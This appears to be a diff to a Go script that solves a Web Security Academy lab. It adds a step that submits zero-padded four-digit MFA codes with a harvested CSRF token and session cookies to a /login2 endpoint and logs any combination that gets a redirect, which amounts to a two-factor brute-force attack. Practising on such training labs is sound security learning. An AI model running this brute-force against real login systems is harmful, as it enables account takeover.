@@ -26,6 +26,8 @@ func solve(hostname string) {
 		log.Printf("Cookies from second step: %s", cookies)
 		csrfToken = thirdStep(hostname, cookies)
 		log.Printf("CSRF Token from third step: %s", csrfToken)
+		mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
+		fourthStep(hostname, cookies, csrfToken, mfaCodeAsString)
 	}
 }
 
@@ -110,6 +112,39 @@ func thirdStep(hostname string, cookies []*http.Cookie) string {
 	return findCsrfTokenInBody(string(responseBody))
 }
 
+func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCode string) {
+	// POST /login2 -- use csrf token from previous step, if 302 notify success, otherwise do not notify
+	uri := fmt.Sprintf("%s/login2", hostname)
+	data := url.Values{"csrf": {csrfToken}, "mfa-code": {mfaCode}}
+
+	req, err := http.NewRequest(http.MethodPost, uri, strings.NewReader(data.Encode()))
+	if err != nil {
+		log.Printf("Something not right when making the request from the fourth step...")
+		return
+	}
+
+	for _, cookie := range cookies {
+		req.AddCookie(cookie)
+	}
+
+	client := &http.Client{
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		log.Printf("Something not right when doing the request from the fourth step...")
+	}
+
+	if resp.StatusCode == http.StatusFound {
+		log.Printf("Use this csrfToken: %s - mfaCode: %s - cookies: %s", csrfToken, mfaCode, cookies)
+	} else {
+		log.Printf("Not today :sad: - StatusCode: %s", resp.Status)
+	}
+}
+
 func findCsrfTokenInBody(body string) string {
 	rgx := regexp.MustCompile(`<input required type="hidden" name="csrf" value="(.*)">`)
 	rs := rgx.FindStringSubmatch(body)
@@ -120,6 +155,6 @@ func findCsrfTokenInBody(body string) string {
 func main() {
 	log.SetFlags(log.LstdFlags | log.Lmicroseconds)
 
-	hardcodedHostname := "https://ac4e1f231e1fc12080d45ccc00c000ff.web-security-academy.net"
+	hardcodedHostname := "https://ac2c1f521e7b328380ba0ed4004c00ae.web-security-academy.net"
 	solve(hardcodedHostname)
 }
